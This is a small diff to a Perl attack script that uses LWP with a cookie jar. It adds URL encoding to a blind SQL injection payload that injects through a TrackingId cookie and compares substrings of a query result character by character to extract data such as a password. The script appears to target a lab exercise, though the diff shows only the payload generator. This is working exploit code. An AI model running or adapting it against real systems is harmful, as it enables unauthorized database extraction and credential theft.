@@ -7,6 +7,7 @@ use strict;
 use warnings;
 use LWP::UserAgent;
 use HTTP::CookieJar::LWP;
+use URI::Encode qw(uri_encode);
 use Getopt::Long;
 use Pod::Usage;
 use feature 'say';
@@ -96,6 +97,7 @@ sub generatePayload {
     my $idx = shift;
     my $pass = shift;
     my $payload = "TrackingId=' or substring($query, $idx, 1) < '$pass";
+    $payload = uri_encode($payload);
     return $payload;
 }
 
